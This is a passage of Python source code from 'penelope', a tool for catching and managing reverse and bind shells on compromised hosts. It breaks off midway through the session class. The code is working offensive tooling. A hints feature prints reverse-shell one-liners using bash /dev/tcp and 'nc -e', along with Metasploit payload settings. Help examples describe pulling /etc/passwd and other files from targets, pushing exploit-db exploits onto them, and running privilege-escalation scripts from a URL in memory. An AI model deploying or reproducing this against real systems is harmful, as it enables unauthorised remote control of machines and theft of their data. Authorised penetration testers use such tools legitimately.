#!/usr/bin/env python3

# Copyright © 2021 - 2023 @brightio <brightiocode@gmail.com>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

__program__= "penelope"
__version__ = "0.11.11"

import os
import io
import re
import pwd
import sys
import tty
import cmd
import ssl
import code
import time
import json
import zlib
import glob
import errno
import shlex
import queue
import struct
import shutil
import select
import socket
import signal
import base64
import string
import random
import termios
import tarfile
import logging
import zipfile
import inspect
import binascii
import textwrap
import argparse
import platform
import traceback
import threading
import subprocess
import http.server
import socketserver
import urllib.request

from math import ceil
from pathlib import Path
from datetime import datetime
from functools import wraps
from itertools import islice
from collections import deque, defaultdict
from configparser import ConfigParser
from urllib.parse import unquote

if not sys.version_info >= (3, 6):
	print("(!) Penelope requires Python version 3.6 or higher (!)")
	sys.exit()

class MainMenu(cmd.Cmd):

	def __init__(self):
		super().__init__()
		self.set_id(None)
		self.commands = {
			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script'],
			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
			"Shell Management"  :['listeners', 'connect', 'hints', 'Interfaces'],
			"Miscellaneous"     :['help', 'history', 'reset', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
		}

	@property
	def raw_commands(self):
		return [command.split('|')[0] for command in sum(self.commands.values(), [])]

	@property
	def active_sessions(self):
		active_sessions = len(core.sessions)
		if active_sessions:
			s = "s" if active_sessions > 1 else ""
			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
		return ""

	@staticmethod
	def sessions(text, *extra):
		options = list(map(str, core.sessions))
		options.extend(extra)
		return [option for option in options if option.startswith(text)]

	@staticmethod
	def confirm(text):
		try:
			__class__.set_auto_history(False)
			answer = input(f"\r{paint(f'[?] {text} (y/N): ').yellow}")
			__class__.set_auto_history(True)
			return answer.lower() == 'y'

		except EOFError:
			return __class__.confirm(text)

	@staticmethod
	def set_auto_history(state):
		if readline:
			readline.set_auto_history(state)

	@staticmethod
	def load_history(histfile):
		if readline:
			readline.clear_history()
			if histfile.exists():
				readline.read_history_file(histfile)

	@staticmethod
	def write_history(histfile):
		if readline:
			readline.set_history_length(options.histlength)

			try:
				readline.write_history_file(histfile)

			except FileNotFoundError:
				cmdlogger.debug(f"History file '{histfile}' does not exist")

	def show(self):
		print()
		threading.Thread(target=self.cmdloop, name='Menu').start()

	def set_id(self, ID):
		self.sid = ID
		session_part = f"{paint('Session').green} {paint('[' + str(self.sid) + ']').red} "\
				if self.sid else ''
		self.prompt = f"{paint(f'┍┽ {__program__} ┾┑').magenta} {session_part}> "

	def session(current=False, extra=[]):
		def inner(func):
			@wraps(func)
			def newfunc(self, ID):
				if current:
					if not self.sid:
						if core.sessions:
							cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
						else:
							cmdlogger.warning("No available sessions to perform this action")
						if func.__name__ == 'do_run':
							self.show_modules()
						return False
				else:
					if ID:
						if ID.isnumeric() and int(ID) in core.sessions:
							ID = int(ID)
						elif ID not in extra:
							cmdlogger.warning("Invalid session ID")
							return False
					else:
						if self.sid:
							ID = self.sid
						else:
							cmdlogger.warning("No session selected")
							return None
				return func(self, ID)
			return newfunc
		return inner

	def preloop(self):
		__class__.load_history(options.cmd_histfile)

	def precmd(self, line):
		__class__.write_history(options.cmd_histfile)
		return line

	def emptyline(self):
		self.lastcmd = None

	def show_help(self, command):
		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
		parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
		modified_parts = []
		for part in parts[2:]:
			part = help_prompt.sub('', part)
			modified_parts.append(part)
		print(textwrap.indent("\n".join(modified_parts), '    '))

		if command == 'run':
			self.show_modules()

	def do_help(self, command):
		"""
		[command | -a]
		Show Main Menu help or help about a specific command

		Examples:

			help		Show all commands at a glance
			help interact	Show extensive information about a command
			help -a		Show extensive information for all commands
		"""
		if command:
			if command == "-a":
				for section in self.commands:
					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
					for command in self.commands[section]:
						self.show_help(command)
			else:
				if command in self.raw_commands:
					self.show_help(command)
				else:
					cmdlogger.warning(
						f"No such command: '{command}'. "
						f"Issue 'help' for all available commands"
					)
		else:
			for section in self.commands:
				print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
				table = Table(joinchar=' · ')
				for command in self.commands[section]:
					parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
				print(table)
			print()

	@session(extra=['none'])
	def do_use(self, ID):
		"""
		[SessionID|none]
		Select a session

		Examples:

			use 1		Select the SessionID 1
			use none	Unselect any selected session
		"""
		if ID == 'none':
			self.set_id(None)
		else:
			self.set_id(ID)

	def do_sessions(self, line):
		"""
		[SessionID]
		Show active sessions or interact with the SessionID

		Examples:

			sessions		Show active sessions
			sessions 1		Interact with SessionID 1
		"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if core.sessions:
				for host, sessions in core.hosts.items():
					print('\n➤  ' + OSes[sessions[0].OS] + " " + str(paint(host).RED + ' 💀'))
					table = Table(joinchar=' | ')
					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'Source')]
					for session in sessions:
						if self.sid == session.id:
							ID = paint('[' + str(session.id) + ']').red
						elif session.new:
							ID = paint('<' + str(session.id) + '>').yellow_BLINK
						else:
							ID = paint(' ' + str(session.id)).yellow
						source = 'Reverse shell from ' + str(session.listener) if session.listener else f'Bind shell (port {session.port})'
						table += [ID, paint(session.type).CYAN if session.type == 'PTY' else session.type, source]
					print("\n", textwrap.indent(str(table), "    "), "\n", sep="")
			else:
				print()
				cmdlogger.warning("No sessions yet 😟")
				print()

	@session()
	def do_interact(self, ID):
		"""
		[SessionID]
		Interact with a session

		Examples:

			interact	Interact with current session
			interact 1	Interact with SessionID 1
		"""
		return core.sessions[ID].attach()

	@session(extra=['*'])
	def do_kill(self, ID):
		"""
		[SessionID|*]
		Kill a session

		Examples:

			kill		Kill the current session
			kill 1		Kill SessionID 1
			kill *		Kill all sessions
		"""
		if ID == '*':
			if not core.sessions:
				cmdlogger.warning("No sessions to kill")
				return False
			else:
				if __class__.confirm(f"Kill all sessions{self.active_sessions}"):
					for session in reversed(list(core.sessions.copy().values())):
						session.kill()
				return
		else:
			core.sessions[ID].kill()

			if options.single_session and not core.sessions:
				core.stop()
				return True

	@session(current=True)
	def do_portfwd(self, line):
		"""
		host:port (<-/->) host:port
		Local and Remote port forwarding

		Examples:

			-> 192.168.0.1:80		Forward the localhost:80 to 192.168.0.1:80
			0.0.0.0:8080 -> 192.168.0.1:80	Forward the 0.0.0.0:8080 to 192.168.0.1:80
		"""
		if not line:
			logger.warning("No parameters...")
			return False

		match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
		if match:
			group1 = match.group(1)
			arrow = match.group(2)
			group2 = match.group(3)
		else:
			logger.warning("Invalid syntax")
			return False

		if arrow == '->':
			_type = 'L'
			if group1:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
				if match:
					lhost = match.group(1)
					lport = match.group(2)
				else:
					logger.warning("Invalid syntax")
					return False
			if group2:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
				if match:
					rhost = match.group(1)
					rport = match.group(2)
				if not rport:
					logger.warning("At least remote port is required")
					return False
			else:
				logger.warning("At least remote port is required")
				return False

		elif arrow == '<-':
			_type = 'R'

			if group2:
				rhost, rport = group2.split(':')

			if group1:
				lhost, lport = group1.split(':')
			else:
				logger.warning("At least local port is required")
				return False

		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=int(lport), rhost=rhost, rport=int(rport))

	@session(current=True)
	def do_download(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target

		Examples:

			download /etc			Download a remote directory
			download /etc/passwd		Download a remote file
			download /etc/cron*		Download multiple remote files and directories using glob
			download /etc/issue /var/spool	Download multiple remote files and directories at once
		"""
		if remote_items:
			core.sessions[self.sid].download(remote_items)
		else:
			cmdlogger.warning("No files or directories specified")

	@session(current=True)
	def do_open(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target and open them locally

		Examples:

			open /etc			Open locally a remote directory
			open /root/secrets.ods		Open locally a remote file
			open /etc/cron*			Open locally multiple remote files and directories using glob
			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
		"""
		if remote_items:
			items = core.sessions[self.sid].download(remote_items)

			if len(items) > options.max_open_files:
				cmdlogger.warning(
					f"More than {options.max_open_files} items selected"
					f" for opening. The open list is truncated to "
					f"{options.max_open_files}."
				)
				items = items[:options.max_open_files]

			for item in items:
				Open(item)
		else:
			cmdlogger.warning("No files or directories specified")

	@session(current=True)
	def do_upload(self, local_items):
		"""
		<glob|URL>...
		Upload files / folders / HTTP(S)/FTP(S) URLs to the target.
		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
		when the target has no Internet access

		Examples:

			upload /tools					  Upload a directory
			upload /tools/mysuperdupertool.sh		  Upload a file
			upload /tools/privesc* /tools2/*.sh		  Upload multiple files and directories using glob
			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
		"""
		if local_items:
			core.sessions[self.sid].upload(local_items, randomize_fname=True)
		else:
			cmdlogger.warning("No files or directories specified")

	@session(current=True)
	def do_script(self, local_item):
		"""
		<local_script|URL>
		Execute a local script or URL from memory in the target and get the output in a local file

		Examples:
			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
		"""
		if local_item:
			core.sessions[self.sid].script(local_item)
		else:
			cmdlogger.warning("No script to execute")

	def show_modules(self):
		table = Table(joinchar=' <-> ')
		table.header = [paint('MODULE NAME').cyan_UNDERLINE, paint('DESCRIPTION').cyan_UNDERLINE]
		for module in Module.modules.values():
			table += [paint(module.name).red, module.description]
		print("\n", table, "\n", sep="")

	@session(current=True)
	def do_run(self, module_name):
		"""
		[module name]
		Run a module. Run 'help run' to view the available modules"""
		if module_name:
			module = Module.modules.get(module_name)
			if module:
				module.session = core.sessions[self.sid]
				module.run()
			else:
				logger.warning(f"Module '{module_name}' does not exist")
		else:
			self.show_modules()

	@session(current=True)
	def do_spawn(self, line):
		"""
		[Port] [Host]
		Spawn a new session.

		Examples:

			spawn			Spawn a new session. If the current is bind then in will create a
						bind shell. If the current is reverse, it will spawn a reverse one

			spawn 5555		Spawn a reverse shell on 5555 port. This can be used to get shell
						on another tab. On the other tab run: ./penelope.py 5555

			spawn 3333 10.10.10.10	Spawn a reverse shell on the port 3333 of the 10.10.10.10 host
		"""
		host, port = None, None

		if line:
			args = line.split(" ")
			try:
				port = int(args[0])
			except ValueError:
				cmdlogger.error("Port number should be numeric")
				return False
			arg_num = len(args)
			if arg_num == 2:
				host = args[1]
			elif arg_num > 2:
				print()
				cmdlogger.error("Invalid PORT - HOST combination")
				self.onecmd("help spawn")
				return False

		core.sessions[self.sid].spawn(port, host)

	def do_maintain(self, line):
		"""
		[NUM]
		Maintain NUM active shells for each target

		Examples:

			maintain 5		Maintain 5 active shells
			maintain 1		Disable maintain functionality
		"""
		if line:
			if line.isnumeric():
				num = int(line)
				options.maintain = num
				refreshed = False
				for host in core.hosts.values():
					if len(host) < num:
						refreshed = True
						host[0].maintain()
				if not refreshed:
					self.onecmd("maintain")
			else:
				cmdlogger.error("Invalid number")
		else:
			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
			cmdlogger.info(f"Value set to {paint(options.maintain).yellow} {status}")

	@session(current=True)
	def do_upgrade(self, ID):
		"""

		Upgrade the current session's shell to PTY.
		Note: By default this is automatically run on the new sessions. Disable it with -U
		"""
		core.sessions[self.sid].upgrade()

	def do_dir(self, ID):
		"""
		[SessionID]
		Open the selected session's local folder. If no session is selected, open the base folder
		"""
		folder = core.sessions[self.sid].directory if self.sid else options.basedir
		Open(folder)

	@session(current=True)
	def do_exec(self, cmdline):
		"""
		<remote command>
		Execute a remote command

		Examples:
			exec cat /etc/passwd
		"""
		if cmdline:
			if core.sessions[self.sid].agent:
				core.sessions[self.sid].exec(
					cmdline,
					preserve_dir=True,
					timeout=None,
					stdout_dst=sys.stdout.buffer,
					stderr_dst=sys.stderr.buffer
				)
			else:
				output = core.sessions[self.sid].exec(
					cmdline,
					preserve_dir=True,
					timeout=None,
					value=True
				)
				print(output)
		else:
			cmdlogger.warning("No command to execute")

	'''@session(current=True) # TODO
	def do_tasks(self, line):
		"""

		Show assigned tasks
		"""
		table = Table(joinchar=' | ')
		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']

		for sessionid in core.sessions:
			tasks = core.sessions[sessionid].tasks
			for taskid in tasks:
				for stream in tasks[taskid]['streams'].values():
					if stream.closed:
						status = paint('Completed!').GREEN
						break
				else:
					status = paint('Active...').YELLOW

				table += [
					paint(sessionid).red,
					paint(taskid).cyan,
					paint(tasks[taskid]['pid']).blue,
					paint(tasks[taskid]['command']).yellow,
					paint(tasks[taskid]['streams']['1'].name).green,
					status
				]

		if len(table) > 1:
			print(table)
		else:
			logger.warning("No assigned tasks")'''

	def do_listeners(self, line):
		"""
		[<add|stop> <Iface|IP> <Port>]
		Add / stop / view Listeners

		Examples:

			listeners			Show active Listeners
			listeners add any 4444		Create a Listener on 0.0.0.0:4444
			listeners stop 0.0.0.0 4444	Stop the Listener on 0.0.0.0:4444
		"""
		if line:
			try:
				subcommand, host, port = line.split(" ")
				port = int(port)

			except ValueError:
				try:
					subcommand, host = line.split(" ")
					if subcommand == "stop" and host == "*":
						listeners = core.listeners.copy()
						if listeners:
							for listener in listeners.values():
								listener.stop()
						else:
							cmdlogger.warning("No listeners to stop...")
							return False
						return

				except ValueError:
					pass

				print()
				cmdlogger.error("Invalid HOST - PORT combination")
				self.onecmd("help listeners")
				return False

			if subcommand == "add":
				host = Interfaces().translate(host)
				Listener(host, port)

			elif subcommand == "stop":
				for listener in core.listeners.values():
					if (listener.host, listener.port) == (host, port):
						listener.stop()
						break
				else:
					cmdlogger.warning("No such Listener...")
			else:
				print()
				cmdlogger.error("Invalid subcommand")
				self.onecmd("help listeners")
				return False
		else:
			if core.listeners:
				for listener in core.listeners.values():
					print(listener)
			else:
				cmdlogger.warning("No registered Listeners...")

	def do_connect(self, line):
		"""
		<Host> <Port>
		Connect to a bind shell

		Examples:

			connect 192.168.0.101 5555
		"""
		try:
			address, port = line.split(' ')

		except ValueError:
			cmdlogger.error("Invalid Host-Port combination")

		else:
			if Connect(address, port) and not options.no_attach:
				return True

	def do_hints(self, line):
		"""

		Reverse shell hints based on the registered listeners
		"""
		if core.listeners:
			print()
			for listener in core.listeners.values():
				print(paint(f"{listener} hints:").cyan_UNDERLINE)
				print(listener.hints, end='\n\n')
		else:
			cmdlogger.warning("No registered Listeners to show hints")

	def do_Interfaces(self, line):
		"""

		Show the local network interfaces
		"""
		print(Interfaces())

	def do_reset(self, line):
		"""

		Reset the local terminal
		"""
		if shutil.which("reset"):
			os.system("reset")
		else:
			cmdlogger.error("'reset' command doesn't exist on the system")

	def do_history(self, line):
		"""

		Show Main Menu history
		"""
		if readline:
			self.write_history(options.cmd_histfile)
			if options.cmd_histfile.exists():
				print(open(options.cmd_histfile).read())
		else:
			cmdlogger.error("Python is not compiled with readline support")

	def do_exit(self, line):
		"""

		Exit Penelope
		"""
		if __class__.confirm(f"Exit Penelope?{self.active_sessions}"):
			core.stop()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join()
			logger.info("Exited!")
			remaining_threads = [thread for thread in threading.enumerate() if thread.name not in ('MainThread', 'Menu')]
			if remaining_threads:
				logger.error(f"Please report this: {remaining_threads}")
			return True
		return False

	def do_EOF(self, line):
		#Unselect session when one is selected
		#if self.sid:
		#	self.set_id(None)
		#	print()
		#else:
		#	return self.do_exit(line)
		print("exit")
		return self.do_exit(line)

	def do_DEBUG(self, line):
		"""

		Open debug console
		"""
		__class__.write_history(options.cmd_histfile)
		__class__.load_history(options.debug_histfile)
		code.interact(banner=paint(
			"===> Entering debugging console...").CYAN, local=globals(),
			exitmsg=paint("<=== Leaving debugging console..."
		).CYAN)
		__class__.write_history(options.debug_histfile)
		__class__.load_history(options.cmd_histfile)

	def do_SET(self, line):
		"""
		[option, [value]]
		Show / set option values.

		Examples:

			SET			Show all options and their current values
			SET no_upgrade		Show the current value of no_upgrade option
			SET no_upgrade True	Set the no_upgrade option to True
		"""
		if not line:
			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
					for param in options.__dict__ if param != 'modules' ]
			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
			print(table)
		else:
			try:
				args = line.split(" ", 1)
				param = args[0]
				if len(args) == 1:
					value = getattr(options, param)
					if isinstance(value, (list, dict)):
						value = json.dumps(value, indent=4)
					print(f"{paint(value).yellow}")
				else:
					new_value = eval(args[1])
					old_value = getattr(options, param)
					setattr(options, param, new_value)
					if getattr(options, param) != old_value:
						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param)).yellow}")

			except AttributeError:
				cmdlogger.error("No such option")

			except Exception as e:
				cmdlogger.error(f"{type(e).__name__}: {e}")

	def default(self, line):
		if line in ['q', 'quit']:
			return self.onecmd('exit')
		elif line == '.':
			return self.onecmd('dir')
		elif line in ('recon', 'batch'):
			logger.warning("This command is deprecated. Check the 'run' command")
		else:
			parts = line.split()
			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
			if not candidates:
				cmdlogger.warning(
					f"No such command: '{line}'. "
					f"Issue 'help' for all available commands"
				)
			elif len(candidates) == 1:
				cmd = f"{candidates[0]} {' '.join(parts[1:])}"
				print(f"\x1b[1A{self.prompt}{cmd}")
				return self.onecmd(cmd)
			else:
				cmdlogger.warning(f"Ambiguous command. Can mean any of: {candidates}")

	def complete_SET(self, text, line, begidx, endidx):
		return [option for option in options.__dict__ if option.startswith(text)]

	def complete_listeners(self, text, line, begidx, endidx):
		subcommands = ["add", "stop"]
		if begidx == 10:
			return [command for command in subcommands if command.startswith(text)]
		if begidx == 14:
			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
		if begidx == 15:
			listeners = [re.search(r'\((.*)\)', str(listener))[1].replace(':', ' ') for listener in core.listeners]
			if len(listeners) > 1:
				listeners.append('*')
			return [listener for listener in listeners if listener.startswith(text)]
		if begidx > 15:
			...#print(line, text)

	# Default cmd module is unable to do that. I will make my own cmd class
	#def complete_upload(self, text, line, begidx, endidx):
	#	print("text: ", shlex.quote(text))
	#	return [item for item in glob.glob(shlex.quote(text) + '*')]

	def complete_use(self, text, line, begidx, endidx):
		return self.sessions(text, "none")

	def complete_sessions(self, text, line, begidx, endidx):
		return self.sessions(text)

	def complete_interact(self, text, line, begidx, endidx):
		return self.sessions(text)

	def complete_kill(self, text, line, begidx, endidx):
		return self.sessions(text, "*")

	def complete_run(self, text, line, begidx, endidx):
		return [module for module in Module.modules.keys() if module.startswith(text)]


class ControlQueue:

	def __init__(self):
		self._out, self._in = os.pipe()
		self.queue = queue.Queue() # TODO

	def fileno(self):
		return self._out

	def __lshift__(self, command):
		self.queue.put(command)
		os.write(self._in, b'\x00')

	def get(self):
		os.read(self._out, 1)
		return self.queue.get()


class Core:

	def __init__(self):
		self.started = False

		self.control = ControlQueue()
		self.rlist = [self.control]
		self.wlist = []

		self.attached_session = None
		self.session_wait_host = None
		self.session_wait = queue.LifoQueue()

		self.lock = threading.Lock() # TO REMOVE

		self.listenerID = 0
		self.listener_lock = threading.Lock()
		self.sessionID = 0
		self.session_lock = threading.Lock()
		self.fileserverID = 0
		self.fileserver_lock = threading.Lock()

		self.sessions = {}
		self.listeners = {}
		self.fileservers = {}
		self.forwardings = {}

	def __getattr__(self, name):

		if name == 'hosts':
			hosts = defaultdict(list)
			for session in self.sessions.values():
				hosts[session.name].append(session)
			return hosts

		elif name == 'new_listenerID':
			with self.listener_lock:
				self.listenerID += 1
				return self.listenerID

		elif name == 'new_sessionID':
			with self.session_lock:
				self.sessionID += 1
				return self.sessionID

		elif name == 'new_fileserverID':
			with self.fileserver_lock:
				self.fileserverID += 1
				return self.fileserverID

		else:
			raise AttributeError(name)

	@property
	def threads(self):
		return [thread.name for thread in threading.enumerate()]

	def start(self):
		self.started = True
		threading.Thread(target=self.loop, name="Core").start()

	def loop(self):

		while self.started:
			readables, writables, _ = select.select(self.rlist, self.wlist, [])

			for readable in readables:

				# The control queue
				if readable is self.control:
					command = self.control.get()
					if command:
						logger.debug(f"About to execute {command}")
					else:
						logger.debug(f"Core break")
					try:
						exec(command)
					except KeyError: # TODO
						logger.debug("The session does not exist anymore")
					break

				# The listeners
				elif readable.__class__ is Listener:
					_socket, endpoint = readable.socket.accept()
					thread_name = f"NewCon{endpoint}"
					logger.debug(f"New thread: {thread_name}")
					threading.Thread(target=Session, args=(_socket, *endpoint, readable),
						name=thread_name).start()

				# STDIN
				elif readable is sys.stdin:
					if self.attached_session:
						session = self.attached_session
						if session.readline:
							continue

						data = os.read(sys.stdin.fileno(), NET_BUF_SIZE)

						if session.subtype == 'cmd':
							self._cmd = data

						if data == options.escape['sequence']:
							if session.alternate_buffer:
								logger.error("(!) Exit the current alternate buffer program first")
							else:
								session.detach()
						else:
							if session.type == 'Basic': # TODO # need to see
								session.record(data,
									_input=not session.interactive)

							elif session.agent:
								data = Messenger.message(Messenger.SHELL, data)

							session.send(data, stdin=True)
					else:
						logger.error("You shouldn't see this error; Please report it")

				# The sessions
				elif readable.__class__ is Session:
					try:
						data = readable.socket.recv(NET_BUF_SIZE)
						if not data:
							raise OSError

					except OSError:
						logger.debug(f"Died while reading")
						readable.kill()
						threading.Thread(target=readable.maintain).start()
						break

					target = readable.shell_response_buf\
					if not readable.subchannel.active\
					and readable.subchannel.allow_receive_shell_data\
					else readable.subchannel

					if readable.agent:
						for _type, _value in readable.messenger.feed(data):
							#print(_type,_value)
							if _type == Messenger.SHELL:
								target.write(_value)

							elif _type == Messenger.STREAM:
								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
								#print((repr(stream_id), repr(data)))
								try:
									readable.streams[stream_id] << data
									if not data:
										readable.streams[stream_id].terminate()
								except (OSError, KeyError):
									logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")

					else:
						target.write(data)

					shell_output = readable.shell_response_buf.getvalue() # TODO
					if shell_output:
						if readable.is_attached:
							os.write(sys.stdout.fileno(), shell_output)

						readable.record(shell_output)

						if b'\x1b[?1049h' in data:
							readable.alternate_buffer = True

						if b'\x1b[?1049l' in data:
							readable.alternate_buffer = False
						#if readable.subtype == 'cmd' and self._cmd == data:
						#	data, self._cmd = b'', b'' # TODO

						readable.shell_response_buf.seek(0)
						readable.shell_response_buf.truncate(0)

			for writable in writables:
				with writable.wlock:
					try:
						sent = writable.socket.send(writable.outbuf.getvalue())
					except OSError:
						logger.debug(f"Died while writing")
						writable.kill()
						threading.Thread(target=writable.maintain).start()
						break

					writable.outbuf.seek(sent)
					remaining = writable.outbuf.read()
					writable.outbuf.seek(0)
					writable.outbuf.truncate()
					writable.outbuf.write(remaining)
					if not remaining:
						self.wlist.remove(writable)

	def stop(self):
		options.maintain = 0

		if self.sessions:
			logger.warning(f"Killing sessions...")
			for session in reversed(list(self.sessions.copy().values())):
				session.kill()

		for listener in self.listeners.copy().values():
			listener.stop()

		for fileserver in self.fileservers.copy().values():
			fileserver.stop()

		self.control << 'self.started = False'

def handle_bind_errors(func):
	@wraps(func)
	def wrapper(*args, **kwargs):
		try:
			return func(*args, **kwargs)

		except PermissionError:
			return "Cannot bind to port: Insufficient privileges"

		except socket.gaierror:
			return "Cannot resolve hostname"

		except OSError as e:
			if e.errno == errno.EADDRINUSE:
				return "The port is currently in use"
			elif e.errno == errno.EADDRNOTAVAIL:
				return "Cannot listen on the requested address"
			else:
				return f"OS error: {str(e)}"

		except OverflowError:
			return "Invalid port number. Valid numbers: 1-65535"

		except ValueError:
			return "Port number must be numeric"
	return wrapper

def Connect(host, port):

	try:
		port = int(port)
		_socket = socket.socket()
		_socket.settimeout(5)
		_socket.connect((host, port))
		_socket.settimeout(None)

	except ConnectionRefusedError:
		logger.error(f"Connection refused... ({host}:{port})")

	except OSError:
		logger.error(f"Cannot reach {host}")

	except OverflowError:
		logger.error("Invalid port number. Valid numbers: 1-65535")

	except ValueError:
		logger.error("Port number must be numeric")

	else:
		if not core.started:
			core.start()
		logger.info(f"Connected to {paint(host).blue}:{paint(port).red} 🎯")
		session = Session(_socket, host, port)
		if session:
			return True

	return False

class Listener:

	def __init__(self, host=None, port=None):
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		port = port or options.default_listener_port
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.setblocking(False)
		self.caller = caller()

		result = self.bind(port)
		if not isinstance(result, str):
			self.start()
			return
		elif not self.caller == 'spawn':
			logger.error(result)

	def __str__(self):
		return f"Listener({self.host}:{self.port})"

	def __bool__(self):
		return hasattr(self, 'id')

	@handle_bind_errors
	def bind(self, port):
		self.port = int(port)
		self.socket.bind((self.host, self.port))

	def fileno(self):
		return self.socket.fileno()

	def start(self):
		specific = ""
		if self.host == '0.0.0.0':
			specific = paint('⇉  ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().list.values()])

		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').red}{paint(self.port).red} {specific}")

		self.socket.listen(5)

		self.id = core.new_listenerID
		core.rlist.append(self)
		core.listeners[self.id] = self
		if not core.started:
			core.start()

		core.control << "" # TODO

		if options.hints:
			print(self.hints)

	def stop(self):

		if threading.current_thread().name != 'Core':
			core.control << f'self.listeners[{self.id}].stop()'
			return

		core.rlist.remove(self)
		del core.listeners[self.id]

		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if options.single_session and core.sessions and not self.caller == 'spawn':
			logger.info(f"Stopping {self} due to Single Session mode")
		else:
			logger.warning(f"Stopping {self}")

	@property
	def hints(self):
		presets = [
			"bash -c 'exec bash >& /dev/tcp/{}/{} 0>&1 &'",
			"nc -e cmd {} {}"
		]

		output = []
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in Interfaces().list.values()]

		for ip in ips:
			output.extend(('', '➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
			output.extend([preset.format(ip, self.port) for preset in presets])

			output.extend(textwrap.dedent(f"""
			{paint('Metasploit').UNDERLINE}
			set PAYLOAD generic/shell_reverse_tcp
			set LHOST {ip}
			set LPORT {self.port}
			set DisablePayloadHandler true
			""").split("\n"))

			output.append("-" * len(max(output, key=len)))

		#output.append("─" * len(max(output, key=len)))

		return f'\r\n'.join(output)

class LocalTCPForwardListener(Listener):
	pass

class LineBuffer:

	def __init__(self):
		self.len = 100
		self.buffer = deque(maxlen=self.len)

	def __lshift__(self, data):
		if data:
			self.buffer.extendleft(data.splitlines(keepends=True))

	def __bytes__(self):
		lines = os.get_terminal_size().lines
		return b''.join(list(islice(self.buffer, 0, lines-1))[::-1])


class Channel:

	def __init__(self, raw=False, expect = []):
		self._read, self._write = os.pipe()
		self.can_use = True
		self.active = False
		self.allow_receive_shell_data = True
		self.control = ControlQueue()

	def fileno(self):
		return self._read

	def read(self):
		return os.read(self._read, NET_BUF_SIZE)

	def write(self, data):
		os.write(self._write, data)


class Session:

	def __init__(self, _socket, target, port, listener=None):
		print("\a", flush=True, end='')

		self.socket = _socket
		self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
		self.socket.setblocking(False)
		self.target, self.port = target, port
		self.ip = _socket.getpeername()[0]
		self._host, self._port = self.socket.getsockname()

		if target == self.ip:
			try:
				self.hostname = socket.gethostbyaddr(target)[0]

			except socket.herror:
				self.hostname = None
				logger.debug(f"Cannot resolve hostname")
		else:
			self.hostname = target

		self.name = f"{self.hostname}~{self.ip}" if self.hostname else self.ip
		self.listener = listener

		self.OS = None
		self.type = None
		self.subtype = None
		self.interactive = None
		self.echoing = None
		self.pty_ready = None
		self.readline = None

		self.version = None
		self.user = None

		self.prompt = None
		self.new = True
		self.version = None

		self.last_lines = LineBuffer()
		self.lock = threading.Lock()
		self.wlock = threading.Lock()

		self.outbuf = io.BytesIO()
		self.shell_response_buf = io.BytesIO()

		self.tasks = dict()
		self.subchannel = Channel()
		self.latency = None

		self.alternate_buffer = False
		self.need_resize = False
		self.agent = False
		self.messenger = Messenger(io.BytesIO)

		self.streamID = 0
		self.streams = dict()
		self.stream_lock = threading.Lock()
		self.stream_code = Messenger.STREAM_CODE
		self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)

		self.shell_pid = None
		self._bin = defaultdict(lambda: "")
		self._tmp = None
		self._cwd = None
		self._bsd = None
		self._tty = None
		self._can_deploy_agent = None

		self.bypass_control_session = False

		self.id = core.new_sessionID
		logger.debug(f"Assigned session ID: {self.id}")
		core.rlist.append(self)
		core.sessions[self.id] = self

